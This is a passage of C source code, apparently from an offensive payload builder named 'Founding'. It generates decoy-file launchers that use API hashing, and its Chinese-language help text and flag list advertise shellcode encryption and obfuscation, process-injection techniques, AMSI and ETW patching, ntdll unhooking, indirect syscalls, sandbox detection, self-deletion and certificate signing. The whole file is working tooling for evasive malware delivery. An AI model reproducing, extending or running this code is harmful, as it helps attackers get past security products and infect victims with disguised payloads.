		printf("[-] Failed to create decoy source file\n");
		free(fileData);
		return;
	}

	// Write the function that extracts and launches the file
	fprintf(decoySource,
		"#define _CRT_SECURE_NO_WARNINGS\n"
		"#include <windows.h>\n"
		"#include \"EntropyReducer.h\"\n"
		"#include \"api_hashing.h\"\n"
		"#include \"typedef.h\"\n"
		"#include <stdio.h>\n\n"
		"#pragma comment(lib, \"shell32.lib\")\n\n"
		"// Embedded decoy file data (size: %u bytes)\n"
		"unsigned char g_decoyData[] = {\n",
		fileSize);

	// Write the file data as a byte array - don't skip any bytes because there's no preamble
	for (DWORD i = 0; i < fileSize; i++) {
		if (i % 16 == 0) fprintf(decoySource, "    ");
		fprintf(decoySource, "0x%02X", fileData[i]);
		if (i < fileSize - 1) fprintf(decoySource, ", ");
		if (i % 16 == 15 || i == fileSize - 1) fprintf(decoySource, "\n");
	}

	// Continue writing the extraction function with the file extension embedded
	fprintf(decoySource,
		"};\n\n"
		"// Store the file extension to use when creating the temp file\n"
		"const char* g_fileExtension = \"%s\";\n\n"
		"void extractAndRunDecoy() {\n"
		"    //api hash\n"
		"    hapi_CreFilA_init();\n"
		"    hapi_WriFil_init();\n"
		"    hapi_LoaLibA_init();\n"
		"    hapi_CloHan_init();\n\n"
		"    SIZE_T  decoy_zone = NULL;\n"
		"    PBYTE   decoy_size = NULL;\n\n"
		"    // Create a temporary file with the original extension\n"
		"    char tempPath[MAX_PATH];\n"
		"    char tempFile[MAX_PATH];\n"
		"    char finalPath[MAX_PATH];\n\n"
		"    // Get temp path and create a temporary file\n"
		"    GetTempPathA(MAX_PATH, tempPath);\n"
		"    GetTempFileNameA(tempPath, \"dec\", 0, tempFile);\n\n"
		"    // Rename to have the correct extension\n"
		"    sprintf(finalPath, \"%%s%%s\", tempFile, g_fileExtension);\n"
		"    MoveFileA(tempFile, finalPath);\n\n"
		"    if (!Deobfuscate(g_decoyData, sizeof(g_decoyData), &decoy_zone, &decoy_size)) {\n"
		"        return;\n"
		"    }\n\n"
		"    // Write the embedded data to the temporary file\n"
		"    HANDLE hFile = hapi_CreFilA(finalPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n"
		"    if (hFile == INVALID_HANDLE_VALUE) {\n"
		"#ifdef MISC_NOPRINT\n"
		"        // No print version\n"
		"#else\n"
		"        printf(\"Failed to create temporary file\\n\");\n"
		"#endif\n"
		"        return;\n"
		"    }\n\n"
		"    DWORD bytesWritten = 0;\n"
		"    if (!hapi_WriFil(hFile, decoy_zone, decoy_size, &bytesWritten, NULL) || bytesWritten != decoy_size) {\n"
		"#ifdef MISC_NOPRINT\n"
		"        // No print version\n"
		"#else\n"
		"        printf(\"Failed to write decoy data to file\\n\");\n"
		"#endif\n"
		"        hapi_CloHan(hFile);\n"
		"        return;\n"
		"    }\n\n"
		"    hapi_CloHan(hFile);\n\n"
		"    HMODULE hShell32 = GetModuleHandleH(shell32_Rotr32A);\n"
		"    if (!hShell32) {\n"
		"        hShell32 = hapi_LoaLibA(\"shell32.dll\");\n"
		"    }\n\n"
		"    if (hShell32) {\n"
		"        typedef HINSTANCE(WINAPI* ShellExecuteAFunc)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);\n"
		"        ShellExecuteAFunc pShellExecuteA = (ShellExecuteAFunc)GetProcAddressH(hShell32, ShellExe_Rotr32A);\n"
		"        if (pShellExecuteA) {\n"
		"            pShellExecuteA(NULL, \"open\", finalPath, NULL, NULL, SW_SHOW);\n"
		"        }\n"
		"        FreeLibrary(hShell32);\n"
		"    }\n"
		"}\n",
		extension
	);

	fclose(decoySource);
	free(fileData);

	// Add the function call to exec.c at the //decoy comment position
	getfilecontentcomment("extractAndRunDecoy();", "output\\code\\exec.c", "//decoy");

	printf("[+] Decoy file embedded successfully\n");
}



void RemoveAllFilesInOutputFolder() {
	WCHAR exePath[MAX_PATH];
	WCHAR outputPath[MAX_PATH];
	WIN32_FIND_DATA findFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		printf("Failed to get the path of the executable.\n");
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Create the output folder path
	wsprintfW(outputPath, L"%s\\output\\code\\*", exePath);

	// Find the first file in the directory
	hFind = FindFirstFileW(outputPath, &findFileData);
	if (hFind == INVALID_HANDLE_VALUE) {
		printf("No files found in the output directory.\n");
		return;
	}

	do {
		// Skip directories
		if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			continue;
		}

		// Construct the full file path
		WCHAR filePath[MAX_PATH];
		wsprintfW(filePath, L"%s\\output\\code\\%s", exePath, findFileData.cFileName);

		// Delete the file
		if (!DeleteFileW(filePath)) {
			wprintf(L"Failed to delete file: %s\n", filePath);
		}
	} while (FindNextFileW(hFind, &findFileData) != 0);

	FindClose(hFind);
}


void RemoveAllFilesInErwinFolder() {
	WCHAR exePath[MAX_PATH];
	WCHAR outputPath[MAX_PATH];
	WIN32_FIND_DATA findFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		printf("Failed to get the path of the executable.\n");
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Create the output folder path
	wsprintfW(outputPath, L"%s\\output\\erwin\\*", exePath);

	// Find the first file in the directory
	hFind = FindFirstFileW(outputPath, &findFileData);
	if (hFind == INVALID_HANDLE_VALUE) {
		printf("No files found in the output directory.\n");
		return;
	}

	do {
		// Skip directories
		if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			continue;
		}

		// Construct the full file path
		WCHAR filePath[MAX_PATH];
		wsprintfW(filePath, L"%s\\output\\erwin\\%s", exePath, findFileData.cFileName);

		// Delete the file
		if (!DeleteFileW(filePath)) {
			wprintf(L"Failed to delete file: %s\n", filePath);
		}
	} while (FindNextFileW(hFind, &findFileData) != 0);

	FindClose(hFind);
}



void RemoveObjFilesInOutputFolder_obj() 
{
	WCHAR exePath[MAX_PATH];
	WCHAR outputPath[MAX_PATH];
	WIN32_FIND_DATAW findFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		printf("Failed to get the path of the executable.\n");
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Create the search path for .obj files in the output folder
	wsprintfW(outputPath, L"%s\\output\\code\\*.obj", exePath);

	// Find the first .obj file in the directory
	hFind = FindFirstFileW(outputPath, &findFileData);
	if (hFind == INVALID_HANDLE_VALUE) {
		printf("No .obj files found in the output directory.\n");
		return;
	}

	do {
		// Skip directories (shouldn't match anyway with *.obj search pattern)
		if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			continue;
		}

		// Construct the full file path
		WCHAR filePath[MAX_PATH];
		wsprintfW(filePath, L"%s\\output\\code\\%s", exePath, findFileData.cFileName);

		// Delete the file
		if (!DeleteFileW(filePath)) {
			wprintf(L"Failed to delete file: %s (Error: %d)\n", filePath, GetLastError());
		}
		else {
			//wprintf(L"Deleted object file: %s\n", findFileData.cFileName);
		}
	} while (FindNextFileW(hFind, &findFileData) != 0);

	FindClose(hFind);
}

void RemoveObjFilesInOutputFolder_pch()
{
	WCHAR exePath[MAX_PATH];
	WCHAR outputPath[MAX_PATH];
	WIN32_FIND_DATAW findFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		printf("Failed to get the path of the executable.\n");
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Create the search path for .obj files in the output folder
	wsprintfW(outputPath, L"%s\\*.pch", exePath);

	// Find the first .obj file in the directory
	hFind = FindFirstFileW(outputPath, &findFileData);
	if (hFind == INVALID_HANDLE_VALUE) {
		printf("No .obj files found in the output directory.\n");
		return;
	}

	do {
		// Skip directories (shouldn't match anyway with *.obj search pattern)
		if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			continue;
		}

		// Construct the full file path
		WCHAR filePath[MAX_PATH];
		wsprintfW(filePath, L"%s\\%s", exePath, findFileData.cFileName);

		// Delete the file
		if (!DeleteFileW(filePath)) {
			wprintf(L"Failed to delete file: %s (Error: %d)\n", filePath, GetLastError());
		}
		else {
			//wprintf(L"Deleted object file: %s\n", findFileData.cFileName);
		}
	} while (FindNextFileW(hFind, &findFileData) != 0);

	FindClose(hFind);
}


//Variables for FreeAllotcate Memory

PBYTE	pPayloadInput = NULL;
PVOID	pCipherText = NULL;
PBYTE	pAppendedPayload = NULL;




int FreeAllocatedMemory()
{
	if (pPayloadInput != NULL)
	{
		HeapFree(GetProcessHeap(), 0, pPayloadInput);
	}

	if (pCipherText != NULL)
	{
		HeapFree(GetProcessHeap(), 0, pCipherText);
	}

	if (pAppendedPayload != NULL && pAppendedPayload != pPayloadInput)
	{
		HeapFree(GetProcessHeap(), 0, pAppendedPayload);
	}

	return 0;
}


// print help
INT PrintHelp(IN CHAR* _Argv0) {
	printf("\n");
	printf("\t\t\t #######################################\n");
	printf("\t\t\t # Founding - In Search of the Unknown #\n");
	printf("\t\t\t #######################################\n\n");
	printf("[!] 用法: Founding.exe <生成器类型> <Payload> <加密/混淆> <Shellcode执行方式> <可选标志>\n\n");
	printf("[i] 加密/混淆选项允许Shellcode以各种格式表示为数组，例如： \n");
	printf("\n");
	printf("\t混淆:\n");
	printf("\t	[+] mac                           ::: Mac 地址       [FC-48-83-E4-F0-E8]\n");
	printf("\t	[+] ipv4                          ::: Ipv4 地址      [252.72.131.228]\n");
	printf("\t	[+] ipv6                          ::: Ipv6 地址      [FC48:83E4:F0E8:C000:0000:4151:4150:5251]\n");
	printf("\t	[+] uuid                          ::: UUid 字符串    [FC4883E4-F0E8-C000-0000-415141505251]\n");
	printf("\n");
	printf("\t加密:\n");
	printf("\t	[+] aes                           ::: 使用随机密钥和IV的AES加密Shellcode\n");
	printf("\t	[+] rc4                           ::: 使用随机密钥的Rc4加密Shellcode\n");
	printf("\t	[+] xor                           ::: 使用随机密钥的Xor加密Shellcode\n\n");
	printf("[i] Shellcode执行方式选项可以是： \n");
	printf("\n");
	printf("\t        [+] apc		                  ::: 异步过程调用 (APC)\n");
	printf("\t        [+] early-bird-debug              ::: 使用远程调试进程的异步过程调用\n");
	printf("\t	[+] early-bird-suspended          ::: 在远程挂起进程上使用APC写入并执行\n");
	printf("\t	[+] enumThreadWindows             ::: 回调函数 EnumThreadWindows\n");
	printf("\t	[+] local-mapping-inject          ::: 本地映射和挂起状态线程\n");
	printf("\t	[+] early-cascade	          ::: Hook ntdll!SE_DllLoaded 以执行 Payload\n");
	printf("\t	[+] fibers	                  ::: Fibers 通过切换执行上下文而不创建新线程来执行\n");
	printf("\t	[+] process-hypnosis	          ::: 以调试模式创建子进程，分离调试器并执行 Payload\n");
	printf("\t	[+] tp-alloc	                  ::: 使用线程池API (TpAllocWait/TpSetWait) 对Shellcode执行进行排队\n");
	printf("\t\t[+] local-hollowing	          ::: 复制线程以在挂起的主线程中重新创建并运行PE (仅RAW生成器适用于.exe)\n\n");
	printf("[i] 可选标志： \n");
	printf("\n");
	printf(" 间接系统调用 (INDIRECT-SYSCALLS):\n");
	printf("\t	[+] --hells-hall                  ::: 将所有实现更改为间接系统调用 (HellsHall)，包括可选标志\n");
	printf("\t	[+] --syswhispers                 ::: 将所有实现更改为间接系统调用 (SysWhispers3)，包括可选标志\n");
	printf("\n");
	printf("          编译器 (COMPILER):\n");
	printf("\t	[+] --llvm                        ::: 使用 clang-LLVM 混淆以规避静态分析，某些实现可能会失败\n");
	printf("\n");
	printf("\t      AMSI:\n");
	printf("\t	[+] --amsi-opensession            ::: 修补 AmsiOpenSession 以返回无效参数\n");
	printf("\t	[+] --amsi-scanbuffer             ::: 修补 AmsiScanBuffer 以返回无效参数\n");
	printf("\t	[+] --amsi-signature              ::: 修补 AmsiSignature 以返回无效字符串，破坏签名值\n");
	printf("\t	[+] --amsi-codetrust              ::: 修补 WldpQueryDynamicCodeTrust 以返回无效参数\n");
	printf("\n");
	printf("\t    UNHOOK:\n");
	printf("\t	[+] --unhooking-createfile        ::: Unhook 使用 CreateFileMappingA 映射的 ntdll.dll\n");
	printf("\t	[+] --unhooking-knowndlls         ::: 从 KnownDlls 目录 Unhook ntdll.dll\n");
	printf("\t	[+] --unhooking-debug             ::: 从新的调试进程复制新的 NTDLL 以 Unhook ntdll.dll\n");
	printf("\t	[+] --hookchain	                  ::: 修改 IAT 以重新路由函数调用，允许拦截和处理它们\n");
	printf("\n");
	printf("\t       ETW:\n");
	printf("\t	[+] --etw-eventwrite              ::: 修补 EtwEventWriteFull, EtwEventWrite 和 EtwEventWriteEx\n");
	printf("\t	[+] --etw-trace-event             ::: 修补 NtTraceEvent\n");
	printf("\t	[+] --etw-peventwritefull         ::: 修补私有函数 EtwpEventWriteFull 以返回无效参数\n");
	printf("\n");
	printf("\t   沙箱 (SANDBOX):\n");
	printf("\t	[+] --api-hammering	          ::: 创建一个随机文件，读/写随机数据，延迟执行10秒\n");
	printf("\t	[+] --delay-mwfmoex	          ::: 使用 MsgWaitForMultipleObjectsEx 延迟执行10秒\n");
	printf("\t	[+] --ntdelay	                  ::: 使用 NtDelayExecution 延迟执行10秒\n");
	printf("\t	[+] --fibonacci	                  ::: 计算斐波那契数列延迟执行10秒\n");
	printf("\t	[+] --mouse-clicks	          ::: 记录点击20秒，如果少于1次点击，则认为是沙箱环境\n");
	printf("\t	[+] --resolution	          ::: 检查分辨率以检测沙箱环境\n");
	printf("\t	[+] --processes	                  ::: 检查系统运行的进程是否少于50个，若是则认为是沙箱环境\n");
	printf("\t	[+] --hardware	                  ::: 检查系统是否少于2个处理器、2GB RAM 和 2个已挂载的USB，若是则认为是沙箱环境\n");
	printf("\n");
	printf("   PAYLOAD-CONTROL:                       \n");
	printf("\t	[+] --check-running	          ::: 检查可执行文件是否已在运行，如果是，则阻止重复执行。\n");
	printf("\t	[+] --self-delete	          ::: 确保 Payload 在执行期间自删除，如果删除失败，则删除文件内容将其大小减为零字节。\n");
	printf("\n");
	printf("\t      其他 (MISC):\n");
	printf("\t	[+] --dll [export_name]           ::: 创建一个带有可选导出函数名的 DLL (默认: runme)，此实现将在后台运行 rundll32\n");
	printf("\t	[+] --dll-stealthy [export_name]  ::: 创建一个带有可选导出函数名的 DLL (默认: runme)，更隐蔽但某些实现可能会失败\n");
	printf("\t	[+] --service                     ::: 创建一个作为服务运行的可执行文件\n");
	printf("\t\t[+] --inflate [number]            ::: 用随机单词填充可执行文件以增加其大小\n");
	printf("\t	[+] --sign [pfx] [pass]           ::: 使用证书对最终可执行文件进行签名 (密码可选)\n");
	printf("\t	[+] --no-window                   ::: 运行时不打开终端窗口\n");
	printf("\t	[+] --no-print                    ::: 运行时不打印任何输出，从实现中删除所有 printf\n");
	printf("\t\t[+] --decoy [file]                ::: 嵌入诱饵文件 (例如 PDF) 以便与 Payload 一起执行\n");
	printf("\n\n");
	//system("PAUSE");
	return -1;
}


INT PrintHelp2(IN CHAR* _Argv0) {
	printf("\n");
	printf("\t\t\t #######################################\n");
	printf("\t\t\t # Founding - In Search of the Unknown #\n");
	printf("\t\t\t #######################################\n\n");
	printf("[!] Usage: Founding.exe <Generator Type> <Payload>\n\n");
	printf("[i] Generators Types Options Can Be: \n");
	printf("\n");
	printf("\t[+] raw <payload.bin>                  ::: Use of .bin payload\n");
	printf("\t[+] donut <payload.exe\\dll>            ::: Use of donut to create a .bin without amsi bypass\n");
	printf("\t[+] clematis <payload.exe>             ::: Use of clematis to create a .bin with garble obfuscation and compression\n");
	printf("\t[+] powershell-donut <payload.ps1>     ::: Use PS2EXE to create a .exe and then use donut to create a .bin\n\n");
	//system("PAUSE");
	return -1;

}


//validate optional flags

// Check for valid optional flags
BOOL IsValidOptionalFlag(const char* flag) {
	// List of supported optional flags
	const char* validFlags[] = {
		"--amsi-opensession",
		"--amsi-scanbuffer",
		"--amsi-signature",
		"--amsi-codetrust",
		"--unhooking-createfile",
		"--unhooking-knowndlls",
		"--unhooking-debug",
		"--hookchain",
		"--etw-eventwrite",
		"--etw-trace-event",
		"--etw-peventwritefull",
		"--no-window",
		"--api-hammering",
		"--mouse-clicks",
		"--resolution",
		"--processes",
		"--hardware",
		"--delay-mwfmoex",
		"--ntdelay",
		"--fibonacci",
		"--check-running",
		"--self-delete",
		"--no-print",
		"--dll",
		"--service",
		"--inflate",
		"--sign",
		"--hells-hall",
		"--decoy",
		"--llvm",
		"--syswhispers",
		"--dll-stealthy",
		NULL  // Sentinel value to mark the end of the array
	};

	for (int i = 0; validFlags[i] != NULL; i++) {
		if (strcmp(flag, validFlags[i]) == 0) {
			return TRUE;
		}
	}

	return FALSE;
}

// Function to check all command line arguments for invalid optional flags
BOOL ValidateOptionalFlags(int argc, char* argv[]) {
	for (int i = 1; i < argc; i++) {
		// Check if argument starts with -- (indicating an optional flag)
		if (argv[i][0] == '-' && argv[i][1] == '-') {
			if (!IsValidOptionalFlag(argv[i])) {
				printf("\n<<<!>>> Invalid optional flag: %s <<<!>>>\n", argv[i]);
				return FALSE;
			}
		}
	}
	return TRUE;
}


//color
void printWithColor(const char* message, WORD color) {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO consoleInfo;

	// Save current attributes
	GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
	WORD originalAttrs = consoleInfo.wAttributes;

	// Set color
	SetConsoleTextAttribute(hConsole, color);

	// Print message
	printf("%s", message);

	// Restore original attributes
	SetConsoleTextAttribute(hConsole, originalAttrs);
}


void copyFileFromFolder(const char* folderName, const char* filename) {
	WCHAR exePath[MAX_PATH];
	WCHAR inputFilePath[MAX_PATH], outputFilePath[MAX_PATH];
	WCHAR wFilename[MAX_PATH];

	// Convert the filename to a wide string
	mbstowcs(wFilename, filename, MAX_PATH);

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		printWithColor("[-] Failed to get executable path.\n", FOREGROUND_RED | FOREGROUND_INTENSITY);
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Construct the full paths
	wsprintfW(inputFilePath, L"%s\\founding\\implementations\\evasion\\%S\\%s", exePath, folderName, wFilename);
	wsprintfW(outputFilePath, L"%s\\output\\code\\%s", exePath, wFilename);

	// Use the Windows API CopyFile function to copy the file
	if (!CopyFileW(inputFilePath, outputFilePath, FALSE)) { // FALSE allows overwriting existing files
		DWORD error = GetLastError();
		printWithColor("[-] Failed to copy file. Error code: ", FOREGROUND_RED | FOREGROUND_INTENSITY);
		printf("%d\n", error);

		// Print more detailed error message for common errors
		if (error == ERROR_FILE_NOT_FOUND) {
			printWithColor("[-] Source file not found: ", FOREGROUND_RED | FOREGROUND_INTENSITY);
			wprintf(L"%s\n", inputFilePath);
		}
		else if (error == ERROR_ACCESS_DENIED) {
			printWithColor("[-] Access denied when copying file.\n", FOREGROUND_RED | FOREGROUND_INTENSITY);
		}
		return;
	}

	// Verify the copy succeeded by checking file sizes
	HANDLE hInput = CreateFileW(inputFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hOutput = CreateFileW(outputFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hInput != INVALID_HANDLE_VALUE && hOutput != INVALID_HANDLE_VALUE) {
		DWORD inputSize = GetFileSize(hInput, NULL);
		DWORD outputSize = GetFileSize(hOutput, NULL);

		CloseHandle(hInput);
		CloseHandle(hOutput);

		if (inputSize != outputSize) {
			printWithColor("[-] File size verification failed. Source and destination file sizes don't match.\n",
				FOREGROUND_RED | FOREGROUND_INTENSITY);
		}
	}
}


void copyFileFromFolder_misc(const char* folderName, const char* filename) {
	WCHAR exePath[MAX_PATH];
	WCHAR inputFilePath[MAX_PATH], outputFilePath[MAX_PATH];
	WCHAR wFilename[MAX_PATH];

	// Convert the filename to a wide string
	mbstowcs(wFilename, filename, MAX_PATH);

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		printWithColor("[-] Failed to get executable path.\n", FOREGROUND_RED | FOREGROUND_INTENSITY);
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Construct the full paths
	wsprintfW(inputFilePath, L"%s\\founding\\misc\\%S\\%s", exePath, folderName, wFilename);
	wsprintfW(outputFilePath, L"%s\\output\\code\\%s", exePath, wFilename);

	// Use the Windows API CopyFile function to copy the file
	if (!CopyFileW(inputFilePath, outputFilePath, FALSE)) { // FALSE allows overwriting existing files
		DWORD error = GetLastError();
		printWithColor("[-] Failed to copy file. Error code: ", FOREGROUND_RED | FOREGROUND_INTENSITY);
		printf("%d\n", error);

		// Print more detailed error message for common errors
		if (error == ERROR_FILE_NOT_FOUND) {
			printWithColor("[-] Source file not found: ", FOREGROUND_RED | FOREGROUND_INTENSITY);
			wprintf(L"%s\n", inputFilePath);
		}
		else if (error == ERROR_ACCESS_DENIED) {
			printWithColor("[-] Access denied when copying file.\n", FOREGROUND_RED | FOREGROUND_INTENSITY);
		}
		return;
	}

	// Verify the copy succeeded by checking file sizes
	HANDLE hInput = CreateFileW(inputFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hOutput = CreateFileW(outputFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hInput != INVALID_HANDLE_VALUE && hOutput != INVALID_HANDLE_VALUE) {
		DWORD inputSize = GetFileSize(hInput, NULL);
		DWORD outputSize = GetFileSize(hOutput, NULL);

		CloseHandle(hInput);
		CloseHandle(hOutput);

		if (inputSize != outputSize) {
			printWithColor("[-] File size verification failed. Source and destination file sizes don't match.\n",
				FOREGROUND_RED | FOREGROUND_INTENSITY);
		}
	}
}

void copyFileExecutionFromFolder(const char* folderName, const char* filename) {
	WCHAR exePath[MAX_PATH];
	WCHAR inputFilePath[MAX_PATH], outputFilePath[MAX_PATH];
	WCHAR wFilename[MAX_PATH];

	// Convert the filename to a wide string
	mbstowcs(wFilename, filename, MAX_PATH);

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		printWithColor("[-] Failed to get executable path.\n", FOREGROUND_RED | FOREGROUND_INTENSITY);
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Construct the full paths
	wsprintfW(inputFilePath, L"%s\\founding\\implementations\\execution\\%S\\%s", exePath, folderName, wFilename);
	wsprintfW(outputFilePath, L"%s\\output\\code\\%s", exePath, wFilename);

	// Use the Windows API CopyFile function to copy the file
	if (!CopyFileW(inputFilePath, outputFilePath, FALSE)) { // FALSE allows overwriting existing files
		DWORD error = GetLastError();
		printWithColor("[-] Failed to copy file. Error code: ", FOREGROUND_RED | FOREGROUND_INTENSITY);
		printf("%d\n", error);

		// Print more detailed error message for common errors
		if (error == ERROR_FILE_NOT_FOUND) {
			printWithColor("[-] Source file not found: ", FOREGROUND_RED | FOREGROUND_INTENSITY);
			wprintf(L"%s\n", inputFilePath);
		}
		else if (error == ERROR_ACCESS_DENIED) {
			printWithColor("[-] Access denied when copying file.\n", FOREGROUND_RED | FOREGROUND_INTENSITY);
		}
		return;
	}

	// Verify the copy succeeded by checking file sizes
	HANDLE hInput = CreateFileW(inputFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hOutput = CreateFileW(outputFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hInput != INVALID_HANDLE_VALUE && hOutput != INVALID_HANDLE_VALUE) {
		DWORD inputSize = GetFileSize(hInput, NULL);
		DWORD outputSize = GetFileSize(hOutput, NULL);

		CloseHandle(hInput);
		CloseHandle(hOutput);

		if (inputSize != outputSize) {
			printWithColor("[-] File size verification failed. Source and destination file sizes don't match.\n",
				FOREGROUND_RED | FOREGROUND_INTENSITY);
		}
	}
}
